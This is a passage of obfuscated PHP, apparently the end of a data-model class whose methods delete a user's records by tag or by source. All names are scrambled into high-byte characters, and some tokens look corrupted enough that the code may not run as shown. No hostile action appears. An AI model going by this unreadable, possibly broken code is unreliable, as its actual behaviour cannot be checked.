$¢©Ğ˜ÚŸ = array($‘¯ßÚ[7], $¢©Ğ˜ÚŸ); } $î÷íáû = array($‘¯ßÚ[1696] => USER_ID, $‘¯ßÚ[535] => $ ·ÚÖÉÁ, $‘¯ßÚ[472] => $¢©Ğ˜ÚŸ); return $this->where($î÷íáû)->delete(); } protected function removeByTag($ÄüÀÁ) { $–œ†ı‘Ô =& $_SERVER[íû‘ş´]; if (!$ÄüÀÁ) { return !1; } $‡Áì¶¾Ô = array($–œ†ı‘Ô[1696] => USER_ID, $–œ†ı‘Ô[535] => $ÄüÀÁ); return $this->where($‡Áì¶¾Ô)->delete(); } protected function removeBySource($ÒÓ†Ÿ®¨) { $ÉÃû¥á“ =& $_SERVER[íû‘ş´]; if (is_array($ÒÓ†Ÿ®¨)) { $ÒÓ†Ÿ®¨ = array($ÉÃû¥á“[7], $ÒÓ†Ÿ®¨); } $è‹í´½ = array($ÉÃû¥á“[1696] => USER_ID, $ÉÃû¥á“[535] => array($ÉÃû¥á“[1072], 0), $ÉÃû¥á“[472] => $ÒÓ†Ÿ®¨); return $this->where($è‹í´½)->delete(); } }